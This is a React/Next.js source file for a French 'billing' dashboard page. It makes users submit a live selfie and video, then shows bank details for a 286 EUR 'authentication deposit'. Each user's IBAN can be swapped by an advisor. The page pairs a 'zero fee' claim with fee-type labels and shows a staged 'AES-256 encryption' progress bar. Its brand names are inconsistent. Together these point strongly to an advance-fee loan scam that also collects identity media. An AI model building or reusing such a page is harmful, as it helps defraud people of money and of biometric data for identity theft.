"use client";

import { useEffect, useState, useRef } from "react";
import { useTranslations } from "next-intl";
import { motion } from "framer-motion";
import {
    CreditCard,
    Landmark,
    CheckCircle,
    Info,
    Copy,
    ArrowLeft,
    ShieldCheck,
    Euro,
    Lock,
    Camera,
    Video,
    Loader2,
    X,
    CheckCircle2,
    Play,
    StopCircle,
    History
} from "lucide-react";
import { auth, db } from "@/lib/firebase";
import { doc, updateDoc, serverTimestamp } from "firebase/firestore";
import { collection, query, where, getDocs, limit, onSnapshot } from "firebase/firestore";
import { AnimatePresence } from "framer-motion";
import { onAuthStateChanged } from "firebase/auth";
import { cn } from "@/lib/utils";
import { useRouter } from "@/i18n/routing";
import PremiumSpinner from "@/components/dashboard/PremiumSpinner";
import Image from "next/image";

export default function BillingPage() {
    const t = useTranslations('Dashboard');
    const router = useRouter();
    const [userId, setUserId] = useState<string | null>(null);
    const [request, setRequest] = useState<any>(null);
    const [isLoading, setIsLoading] = useState(true);
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [copiedField, setCopiedField] = useState<string | null>(null);

    // Tunnel Steps: 0: Intro, 1: Selfie, 2: Video, 3: Processing, 4: RIB
    const [verificationStep, setVerificationStep] = useState(0);
    const [selfiePreview, setSelfiePreview] = useState<string | null>(null);
    const [selfieFile, setSelfieFile] = useState<File | null>(null);
    const [videoPreview, setVideoPreview] = useState<string | null>(null);
    const [videoFile, setVideoFile] = useState<Blob | null>(null);
    const [isRecording, setIsRecording] = useState(false);
    const [recordingTime, setRecordingTime] = useState(0);
    const [stream, setStream] = useState<MediaStream | null>(null);
    const videoRef = useRef<HTMLVideoElement>(null);
    const mediaRecorderRef = useRef<MediaRecorder | null>(null);
    const chunksRef = useRef<Blob[]>([]);
    const fileInputRef = useRef<HTMLInputElement>(null);
    const videoInputRef = useRef<HTMLInputElement>(null);
    const [systemError, setSystemError] = useState<string | null>(null);

    const advisorRIB = request?.customRIB || {
        bankName: "ELYSSIO INVESTMENT BANK",
        iban: "FR76 3000 3020 1000 5000 7890 123",
        bic: "ELYSPRPPXXX",
        beneficiary: "ELYSSIO FINANCE - CONSEILLER FINANCIER"
    };

    const paymentTypeLabel = {
        frais_dossier: "Frais de Dossier",
        assurance: "Assurance",
        frais_notaire: "Frais de Notaire",
        authentication_deposit: "Dépôt d'Authentification",
        none: "Aucun"
    }[request?.paymentType as string] || "Dépôt d'Authentification";

    useEffect(() => {
        const unsubscribe = onAuthStateChanged(auth, async (user) => {
            if (user) {
                setUserId(user.uid);
                try {
                    const q = query(
                        collection(db, "requests"),
                        where("userId", "==", user.uid),
                        limit(1)
                    );
                    const querySnapshot = await getDocs(q);
                    if (!querySnapshot.empty) {
                        const data = querySnapshot.docs[0].data();
                        setRequest({ id: querySnapshot.docs[0].id, ...data });

                        // Si la vérification est déjà faite, on saute au RIB
                        if (data.paymentVerificationStatus === 'verified' || data.paymentVerificationStatus === 'on_review') {
                            setVerificationStep(4);
                        }
                    }
                } catch (error: any) {
                    console.error("Error fetching payment request:", error);
                    setSystemError(error.code === 'permission-denied' ? "Accès refusé aux données de paiement." : error.message);
                } finally {
                    setIsLoading(false);
                }
            } else {
                router.push("/login");
            }
        });
        return () => {
            unsubscribe();
            stopCamera();
        };
    }, [router]);

    const startCamera = async () => {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                throw new Error("L'API MediaDevices n'est pas disponible sur ce navigateur.");
            }

            const mediaStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: "user",
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            setStream(mediaStream);
            if (videoRef.current) {
                videoRef.current.srcObject = mediaStream;
            }
        } catch (error: any) {
            console.error("Camera error:", error);
            let msg = "Impossible d'accéder à la caméra.";

            if (error.name === "NotAllowedError" || error.name === "PermissionDeniedError") {
                msg = "Accès à la caméra refusé. Veuillez autoriser la caméra dans les paramètres de votre navigateur et de votre système (Windows/Mac).";
            } else if (error.name === "NotFoundError" || error.name === "DevicesNotFoundError") {
                msg = "Aucune caméra détectée sur votre appareil.";
            } else if (error.name === "NotReadableError" || error.name === "TrackStartError") {
                msg = "La caméra est déjà utilisée par une autre application.";
            }

            setSystemError(msg);
        }
    };

    const stopCamera = () => {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            setStream(null);
        }
    };

    const capturePhoto = () => {
        if (videoRef.current) {
            const canvas = document.createElement("canvas");
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx?.drawImage(videoRef.current, 0, 0);

            const dataUrl = canvas.toDataURL("image/jpeg");
            setSelfiePreview(dataUrl);

            // Convert to file
            fetch(dataUrl)
                .then(res => res.blob())
                .then(blob => {
                    const file = new File([blob], "selfie.jpg", { type: "image/jpeg" });
                    setSelfieFile(file);
                });

            stopCamera();
            setVerificationStep(2);
        }
    };

    const startRecording = () => {
        if (!stream) return;

        chunksRef.current = [];
        const mediaRecorder = new MediaRecorder(stream);
        mediaRecorderRef.current = mediaRecorder;

        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunksRef.current.push(e.data);
        };

        mediaRecorder.onstop = () => {
            const blob = new Blob(chunksRef.current, { type: "video/webm" });
            const url = URL.createObjectURL(blob);
            setVideoPreview(url);
            setVideoFile(blob);
            stopCamera();
        };

        mediaRecorder.start();
        setIsRecording(true);
        setRecordingTime(0);

        const timer = setInterval(() => {
            setRecordingTime(prev => {
                if (prev >= 5) {
                    clearInterval(timer);
                    stopRecording();
                    return 5;
                }
                return prev + 1;
            });
        }, 1000);
    };

    const stopRecording = () => {
        if (mediaRecorderRef.current && isRecording) {
            mediaRecorderRef.current.stop();
            setIsRecording(false);
        }
    };

    const uploadToCloudinary = async (file: File | Blob, type: "image" | "video") => {
        const cloudName = process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME;
        const uploadPreset = process.env.NEXT_PUBLIC_CLOUDINARY_UPLOAD_PRESET;

        const formData = new FormData();
        formData.append("file", file);
        formData.append("upload_preset", uploadPreset!);
        formData.append("folder", `payments/verifications/${userId}`);

        try {
            const response = await fetch(
                `https://api.cloudinary.com/v1_1/${cloudName}/${type}/upload`,
                {
                    method: "POST",
                    body: formData
                }
            );

            if (!response.ok) throw new Error("Erreur lors de l'upload");
            const data = await response.json();
            return data.secure_url;
        } catch (error) {
            console.error("Cloudinary error:", error);
            throw error;
        }
    };

    const finalizeVerification = async () => {
        if (!userId || !request || !selfieFile || !videoFile) return;

        setIsSubmitting(true);
        try {
            const selfieUrl = await uploadToCloudinary(selfieFile, "image");
            const videoUrl = await uploadToCloudinary(videoFile, "video");

            await updateDoc(doc(db, "requests", request.id), {
                paymentVerificationStatus: 'on_review',
                paymentSelfieUrl: selfieUrl,
                paymentVideoUrl: videoUrl,
                paymentVerificationSubmittedAt: serverTimestamp()
            });

            setVerificationStep(4);
        } catch (error) {
            console.error("Submit error:", error);
            setSystemError("Une erreur est survenue lors de l'envoi de votre vérification.");
        } finally {
            setIsSubmitting(false);
        }
    };

    const copyToClipboard = (text: string, field: string) => {
        navigator.clipboard.writeText(text);
        setCopiedField(field);
        setTimeout(() => setCopiedField(null), 2000);
    };

    if (isLoading) return <PremiumSpinner />;

    const handleManualSelfie = (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0];
        if (!file) return;
        setSelfieFile(file);
        setSelfiePreview(URL.createObjectURL(file));
        setVerificationStep(2);
    };

    const handleManualVideo = (e: React.ChangeEvent<HTMLInputElement>) => {
        const file = e.target.files?.[0];
        if (!file) return;
        setVideoFile(file);
        setVideoPreview(URL.createObjectURL(file));
    };

    return (
        <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-10 pb-20 relative overflow-hidden"
        >
            {/* Mobile Decorative Orbs */}
            <div className="absolute top-[-5%] right-[-15%] w-[70%] h-[30%] bg-ely-blue/10 rounded-full blur-[100px] pointer-events-none md:hidden" />

            {systemError && (
                <div className="absolute top-0 left-0 right-0 z-[100] p-4 bg-red-500 text-white text-center font-bold animate-in slide-in-from-top duration-500">
                    <p className="flex items-center justify-center gap-2">
                        <Info className="w-5 h-5" />
                        {systemError}
                        <button onClick={() => setSystemError(null)} className="ml-4 underline">OK</button>
                    </p>
                </div>
            )}

            <header className="flex items-center gap-4 relative z-10 px-2">
                <button
                    onClick={() => router.back()}
                    className="p-3.5 bg-white rounded-2xl border border-slate-100 text-slate-400 hover:text-ely-blue transition-all shadow-sm active:scale-95 group"
                >
                    <ArrowLeft className="w-5 h-5 group-hover:-translate-x-1 transition-transform" />
                </button>
                <div>
                    <h1 className="text-3xl md:text-4xl font-black text-slate-900 tracking-tighter uppercase">Facturation</h1>
                    <p className="text-slate-500 font-medium text-lg leading-none mt-1">Gérez vos paiements et vos dépôts sécurisés.</p>
                </div>
            </header>

            {(!request || request.status !== 'approved' || (request.requiresPayment && request.paymentStatus === 'paid') || request.paymentType === 'none') ? (
                <div className="bg-white rounded-[3.5rem] p-16 md:p-24 text-center border border-slate-100 shadow-sm relative z-10 overflow-hidden group">
                    <div className="absolute top-0 right-0 w-64 h-64 -mr-32 -mt-32 bg-slate-50 opacity-50 rounded-full group-hover:scale-110 transition-transform duration-700" />

                    <div className="relative z-10">
                        <div className="w-24 h-24 bg-slate-50 rounded-[2.5rem] flex items-center justify-center mx-auto mb-8 transform rotate-3 shadow-inner">
                            <CreditCard className="w-12 h-12 text-slate-200" />
                        </div>
                        <h2 className="text-2xl font-black text-slate-900 mb-4 tracking-tight uppercase">
                            Aucune facturation en attente
                        </h2>
                        <p className="text-slate-500 max-w-sm mx-auto font-medium text-lg leading-relaxed">
                            Votre compte est à jour. Aucune action de paiement n'est requise pour le moment.
                        </p>
                        <button
                            onClick={() => router.push("/dashboard")}
                            className="mt-10 px-10 py-5 bg-gradient-to-r from-ely-blue to-blue-700 text-white rounded-2xl font-black text-xs uppercase tracking-widest hover:scale-[1.02] active:scale-95 transition-all shadow-xl shadow-blue-900/10"
                        >
                            Tableau de Bord
                        </button>
                    </div>
                </div>
            ) : verificationStep < 4 ? (
                <div className="max-w-3xl mx-auto relative z-10">
                    <AnimatePresence mode="wait">
                        {verificationStep === 0 && (
                            <motion.div
                                key="intro"
                                initial={{ opacity: 0, scale: 0.9 }}
                                animate={{ opacity: 1, scale: 1 }}
                                exit={{ opacity: 0, scale: 0.9 }}
                                className="bg-white rounded-[3.5rem] p-10 md:p-16 border border-slate-100 shadow-xl overflow-hidden text-center space-y-8"
                            >
                                <div className="w-20 h-20 bg-ely-blue/10 text-ely-blue rounded-3xl flex items-center justify-center mx-auto ring-8 ring-ely-blue/5">
                                    <ShieldCheck className="w-10 h-10" />
                                </div>
                                <div className="space-y-4">
                                    <h2 className="text-3xl font-black text-slate-900 tracking-tight uppercase">Vérification de Sécurité</h2>
                                    <p className="text-slate-500 text-lg font-medium leading-relaxed max-w-lg mx-auto">
                                        Pour valider votre dépôt d'authentification et sécuriser l'accès aux fonds, nous devons confirmer votre identité par un selfie en direct et une courte séquence vidéo.
                                    </p>
                                </div>
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-left">
                                    <div className="p-5 bg-slate-50 rounded-2xl border border-slate-100 flex items-start gap-4">
                                        <div className="w-10 h-10 bg-white rounded-xl flex items-center justify-center shadow-sm text-ely-blue shrink-0">
                                            <Camera className="w-5 h-5" />
                                        </div>
                                        <p className="text-[11px] font-bold text-slate-500 leading-tight uppercase tracking-wider pt-1">
                                            <span className="text-slate-900 block mb-1">Selfie Photo</span>
                                            Visage dégagé, bonne luminosité.
                                        </p>
                                    </div>
                                    <div className="p-5 bg-slate-50 rounded-2xl border border-slate-100 flex items-start gap-4">
                                        <div className="w-10 h-10 bg-white rounded-xl flex items-center justify-center shadow-sm text-ely-blue shrink-0">
                                            <Video className="w-5 h-5" />
                                        </div>
                                        <p className="text-[11px] font-bold text-slate-500 leading-tight uppercase tracking-wider pt-1">
                                            <span className="text-slate-900 block mb-1">Selfie Vidéo (5s)</span>
                                            Tournez légèrement la tête.
                                        </p>
                                    </div>
                                </div>
                                <button
                                    onClick={() => {
                                        setVerificationStep(1);
                                        startCamera();
                                    }}
                                    className="w-full py-6 bg-ely-blue text-white rounded-[2rem] font-black text-sm uppercase tracking-widest hover:bg-blue-700 transition-all shadow-xl shadow-blue-500/20 active:scale-95"
                                >
                                    Démarrer la vérification
                                </button>
                                <p className="text-[10px] text-slate-400 font-black uppercase tracking-widest">Action obligatoire • Conforme GDPR</p>
                            </motion.div>
                        )}

                        {(verificationStep === 1 || verificationStep === 2) && (
                            <motion.div
                                key="capture"
                                initial={{ opacity: 0, y: 20 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -20 }}
                                className="bg-slate-900 rounded-[3.5rem] p-6 md:p-10 shadow-2xl overflow-hidden relative"
                            >
                                <div className="relative aspect-square md:aspect-video rounded-[2.5rem] overflow-hidden bg-black border border-white/10 shadow-inner">
                                    {stream ? (
                                        <video
                                            ref={videoRef}
                                            autoPlay
                                            playsInline
                                            muted
                                            className="w-full h-full object-cover scale-x-[-1]"
                                        />
                                    ) : (
                                        <div className="w-full h-full flex flex-col items-center justify-center space-y-4">
                                            <Loader2 className="w-12 h-12 text-ely-blue animate-spin" />
                                            <p className="text-white/40 font-black uppercase tracking-widest text-xs">Accès caméra en cours...</p>
                                        </div>
                                    )}

                                    {/* Overlay elements */}
                                    <div className="absolute inset-0 pointer-events-none border-[20px] md:border-[40px] border-black/20" />
                                    <div className="absolute top-8 left-1/2 -translate-x-1/2 px-6 py-2 bg-black/60 backdrop-blur-md rounded-full border border-white/20 whitespace-nowrap">
                                        <p className="text-white text-[10px] font-black uppercase tracking-[0.2em]">
                                            {verificationStep === 1 ? "Capturez votre selfie" : isRecording ? `Enregistrement : ${recordingTime}s / 5s` : "Prêt pour la vidéo"}
                                        </p>
                                    </div>

                                    {isRecording && (
                                        <div className="absolute inset-0 border-4 border-red-500 rounded-[2.5rem] animate-pulse pointer-events-none" />
                                    )}
                                </div>

                                <div className="mt-8 flex items-center justify-center gap-6">
                                    <button
                                        onClick={() => {
                                            stopCamera();
                                            setVerificationStep(0);
                                        }}
                                        className="p-5 bg-white/5 hover:bg-white/10 text-white rounded-3xl transition-all active:scale-95"
                                    >
                                        <X className="w-6 h-6" />
                                    </button>

                                    {verificationStep === 1 ? (
                                        <button
                                            onClick={capturePhoto}
                                            disabled={!stream}
                                            className="w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-2xl active:scale-90 transition-all disabled:opacity-50 disabled:scale-100"
                                        >
                                            <div className="w-16 h-16 rounded-full border-4 border-slate-900 border-dashed animate-[spin_10s_linear_infinite]" />
                                            <Camera className="w-8 h-8 text-slate-900 absolute" />
                                        </button>
                                    ) : (
                                        <button
                                            onClick={isRecording ? stopRecording : startRecording}
                                            disabled={!!(!stream || (videoPreview && !isRecording))}
                                            className={cn(
                                                "w-20 h-20 rounded-full flex items-center justify-center shadow-2xl transition-all active:scale-90 disabled:opacity-50",
                                                isRecording ? "bg-red-500 scale-110" : "bg-white"
                                            )}
                                        >
                                            {isRecording ? <StopCircle className="w-10 h-10 text-white" /> : <Play className="w-10 h-10 text-slate-900 ml-1" />}
                                        </button>
                                    )}

                                    {videoPreview && !isRecording && (
                                        <button
                                            onClick={() => {
                                                setVideoPreview(null);
                                                setVideoFile(null);
                                                startCamera();
                                            }}
                                            className="p-5 bg-white/5 hover:bg-white/10 text-white rounded-3xl transition-all active:scale-95"
                                        >
                                            <History className="w-6 h-6" />
                                        </button>
                                    )}

                                    {!stream && !isRecording && (
                                        <div className="flex flex-col items-center gap-4">
                                            <button
                                                onClick={() => verificationStep === 1 ? fileInputRef.current?.click() : videoInputRef.current?.click()}
                                                className="px-6 py-3 bg-white/10 hover:bg-white/20 text-white rounded-2xl text-xs font-bold transition-all flex items-center gap-2 border border-white/10"
                                            >
                                                {verificationStep === 1 ? "Télécharger Photo" : "Télécharger Vidéo"}
                                            </button>
                                            <input type="file" ref={fileInputRef} onChange={handleManualSelfie} accept="image/*" className="hidden" />
                                            <input type="file" ref={videoInputRef} onChange={handleManualVideo} accept="video/*" className="hidden" />
                                        </div>
                                    )}
                                </div>

                                {(selfiePreview && verificationStep === 2 && !isRecording) && (
                                    <div className="mt-8 pt-8 border-t border-white/5 flex items-center justify-between">
                                        <div className="flex gap-4">
                                            <div className="relative w-16 h-16 rounded-xl overflow-hidden border border-white/10">
                                                <Image src={selfiePreview} alt="Selfie" fill className="object-cover" />
                                                <div className="absolute inset-0 bg-emerald-500/20 flex items-center justify-center"><CheckCircle2 className="w-6 h-6 text-white" /></div>
                                            </div>
                                            <div className="space-y-1 py-1">
                                                <p className="text-white font-black text-xs uppercase tracking-widest">Selfie validé</p>
                                                {videoPreview && <p className="text-emerald-400 font-black text-[10px] uppercase tracking-widest">Vidéo prête (5s)</p>}
                                            </div>
                                        </div>

                                        {videoPreview && (
                                            <button
                                                onClick={() => setVerificationStep(3)}
                                                className="px-10 py-5 bg-ely-mint text-slate-900 rounded-3xl font-black text-xs uppercase tracking-widest hover:scale-105 transition-all shadow-xl shadow-ely-mint/20"
                                            >
                                                Finaliser
                                            </button>
                                        )}
                                    </div>
                                )}
                            </motion.div>
                        )}

                        {verificationStep === 3 && (
                            <motion.div
                                key="processing"
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                className="bg-white rounded-[3.5rem] p-16 md:p-24 text-center border border-slate-100 shadow-xl space-y-10"
                            >
                                <div className="relative w-24 h-24 mx-auto">
                                    <div className="absolute inset-0 bg-ely-blue/10 rounded-full animate-ping" />
                                    <div className="relative w-24 h-24 bg-white rounded-full flex items-center justify-center shadow-lg border border-slate-100">
                                        {isSubmitting ? <Loader2 className="w-10 h-10 text-ely-blue animate-spin" /> : <CheckCircle2 className="w-10 h-10 text-emerald-500" />}
                                    </div>
                                </div>
                                <div className="space-y-4">
                                    <h2 className="text-3xl font-black text-slate-900 tracking-tight uppercase">
                                        {isSubmitting ? "Traitement de vos fichiers" : "Fichiers transmis !"}
                                    </h2>
                                    <p className="text-slate-500 text-lg font-medium max-w-sm mx-auto leading-relaxed">
                                        {isSubmitting
                                            ? "Nous sécurisons vos données et finalisons la liaison de votre profil de paiement."
                                            : "Votre identité a été soumise avec succès. Vous pouvez désormais accéder aux coordonnées de dépôt."}
                                    </p>
                                </div>
                                {isSubmitting ? (
                                    <div className="pt-4 flex flex-col items-center gap-3">
                                        <div className="w-48 h-1.5 bg-slate-100 rounded-full overflow-hidden">
                                            <motion.div
                                                className="h-full bg-ely-blue"
                                                initial={{ width: 0 }}
                                                animate={{ width: "100%" }}
                                                transition={{ duration: 15 }}
                                            />
                                        </div>
                                        <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Chiffrement AES-256 en cours</p>
                                    </div>
                                ) : (
                                    <button
                                        onClick={finalizeVerification}
                                        className="px-14 py-6 bg-slate-900 text-white rounded-[2rem] font-black text-sm uppercase tracking-widest hover:bg-black transition-all shadow-xl"
                                    >
                                        Voir les coordonnées
                                    </button>
                                )}
                            </motion.div>
                        )}
                    </AnimatePresence>
                </div>
            ) : (
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 relative z-10">
                    {/* Zero Fee Policy Card */}
                    <div className="lg:col-span-1 space-y-8">
                        <div className="bg-gradient-to-br from-slate-900 via-ely-blue to-blue-900 rounded-[3rem] p-10 text-white shadow-2xl shadow-blue-900/40 relative overflow-hidden group">
                            <div className="absolute top-0 right-0 p-10 opacity-10 group-hover:scale-110 transition-transform duration-700">
                                <ShieldCheck className="w-32 h-32" />
                            </div>

                            <div className="inline-flex items-center gap-3 px-4 py-2 bg-white/10 backdrop-blur-md rounded-full mb-8 border border-white/10">
                                <span className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse" />
                                <span className="text-[10px] font-black tracking-widest uppercase text-white/90 pt-0.5">Charte Zéro Frais</span>
                            </div>

                            <h3 className="text-2xl font-black mb-6 relative z-10 tracking-tight leading-tight uppercase">Politique de Transparence</h3>
                            <p className="text-white/70 text-base leading-relaxed relative z-10 mb-10 font-medium italic">
                                AGM INVEST n'applique <span className="text-white font-black underline underline-offset-4 decoration-emerald-400">aucun frais caché</span>.
                                <br /><br />
                                Le virement demandé est un <span className="text-white font-bold">Dépôt d'Authentification</span> qui sera crédité sur votre solde.
                            </p>

                            <div className="bg-white/10 backdrop-blur-xl rounded-3xl p-8 border border-white/10 shadow-inner group-hover:bg-white/15 transition-colors">
                                <p className="text-[10px] uppercase font-black text-white/50 mb-2 tracking-widest">Montant du Dépôt</p>
                                <p className="text-5xl font-black tracking-tighter">286.00 €</p>
                                <div className="mt-4 pt-4 border-t border-white/10 flex items-center gap-2">
                                    <CheckCircle className="w-4 h-4 text-emerald-400" />
                                    <p className="text-[10px] font-black text-emerald-400 uppercase tracking-widest">Crédité à 100%</p>
                                </div>
                            </div>
                        </div>

                        <div className="bg-white rounded-[2.5rem] p-8 border border-slate-100 shadow-sm flex items-start gap-5 group transition-all hover:bg-slate-50">
                            <div className="w-14 h-14 bg-amber-50 text-amber-500 rounded-2xl flex items-center justify-center shrink-0 shadow-sm ring-8 ring-amber-50/50 group-hover:scale-110 transition-transform">
                                <Info className="w-7 h-7" />
                            </div>
                            <div>
                                <h4 className="font-black text-slate-900 text-sm mb-1 uppercase tracking-tight">Sécurité SEPA</h4>
                                <p className="text-sm text-slate-500 leading-relaxed font-bold italic opacity-80">
                                    Virement instantané sécurisé vers notre partenaire européen.
                                </p>
                            </div>
                        </div>
                    </div>

                    {/* RIB Card */}
                    <div className="lg:col-span-2 space-y-8">
                        <div className="bg-white rounded-[3.5rem] p-10 md:p-14 border border-slate-100 shadow-sm relative overflow-hidden group">
                            <div className="absolute top-[-5%] left-[-5%] w-64 h-64 bg-slate-50 rounded-full blur-3xl opacity-50 pointer-events-none" />

                            <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-12 relative z-10">
                                <div className="flex items-center gap-5">
                                    <div className="w-16 h-16 bg-gradient-to-br from-ely-blue to-blue-700 text-white rounded-2xl flex items-center justify-center shadow-xl shadow-blue-900/20 ring-4 ring-blue-50">
                                        <Landmark className="w-8 h-8" />
                                    </div>
                                    <div>
                                        <h3 className="text-2xl font-black text-slate-900 tracking-tight uppercase leading-none mb-1">Coordonnées</h3>
                                        <p className="text-[10px] text-slate-400 font-black tracking-widest uppercase">Virement du Dépôt</p>
                                    </div>
                                </div>
                                <div className="hidden md:flex flex-col items-end">
                                    <div className="flex items-center gap-2 px-3 py-1 bg-blue-50 text-ely-blue rounded-full border border-blue-100">
                                        <Lock className="w-3.5 h-3.5" />
                                        <span className="text-[10px] font-black uppercase tracking-widest">Transfert Sécurisé</span>
                                    </div>
                                </div>
                            </div>

                            <div className="space-y-8 relative z-10">
                                {[
                                    { label: "Bénéficiaire", value: advisorRIB.beneficiary, field: "beneficiary" },
                                    { label: "Établissement", value: advisorRIB.bankName, field: "bank" },
                                    { label: "Code IBAN", value: advisorRIB.iban, field: "iban", mono: true },
                                    { label: "Code BIC (SWIFT)", value: advisorRIB.bic, field: "bic", mono: true },
                                ].map((item, i) => (
                                    <div key={i} className="group/item">
                                        <div className="flex justify-between items-center mb-3">
                                            <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest pl-1">{item.label}</p>
                                            {copiedField === item.field && (
                                                <span className="text-[10px] font-black text-emerald-500 uppercase tracking-widest animate-in fade-in slide-in-from-right-2">Copié !</span>
                                            )}
                                        </div>
                                        <div className={cn(
                                            "flex items-center justify-between p-5 md:p-6 bg-slate-50/50 rounded-3xl border border-slate-100 group-hover/item:border-ely-blue/30 group-hover/item:bg-white transition-all duration-300",
                                            copiedField === item.field && "border-emerald-500/50 bg-emerald-50/10"
                                        )}>
                                            <p className={cn(
                                                "text-sm md:text-lg font-black text-slate-900 truncate pr-4 transition-colors",
                                                item.mono && "font-mono tracking-tight text-base md:text-xl",
                                                copiedField === item.field && "text-emerald-600"
                                            )}>
                                                {item.value}
                                            </p>
                                            <button
                                                onClick={() => copyToClipboard(item.value, item.field)}
                                                className={cn(
                                                    "p-3 rounded-2xl transition-all shrink-0 active:scale-90",
                                                    copiedField === item.field
                                                        ? "bg-emerald-500 text-white shadow-lg shadow-emerald-500/30"
                                                        : "bg-white text-slate-400 hover:text-ely-blue shadow-sm border border-slate-100"
                                                )}
                                            >
                                                {copiedField === item.field ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                                            </button>
                                        </div>
                                    </div>
                                ))}
                            </div>

                            <div className="mt-14 flex flex-col md:flex-row items-center gap-6 p-8 bg-blue-50/30 rounded-[2.5rem] border border-blue-100/50 relative overflow-hidden group/info">
                                <div className="absolute top-0 right-0 p-10 opacity-[0.05] group-hover/info:rotate-12 transition-transform duration-700">
                                    <ShieldCheck className="w-24 h-24" />
                                </div>
                                <div className="w-14 h-14 bg-white rounded-2xl flex items-center justify-center text-ely-blue shadow-sm shrink-0 ring-4 ring-blue-50">
                                    <ShieldCheck className="w-8 h-8" />
                                </div>
                                <p className="text-sm text-blue-900/80 font-bold italic leading-relaxed text-center md:text-left relative z-10">
                                    Ce transfert est strictement confidentiel. Votre conseiller recevra une notification automatique lors de la réception des fonds par notre banque partenaire.
                                </p>
                            </div>
                        </div>

                        <div className="flex justify-center pt-4">
                            <button
                                onClick={() => router.push("/dashboard")}
                                className="flex items-center gap-2 text-slate-400 hover:text-slate-600 transition-all font-black text-xs uppercase tracking-widest opacity-60 hover:opacity-100"
                            >
                                <ArrowLeft className="w-4 h-4" />
                                Revenir plus tard
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </motion.div>
    );
}
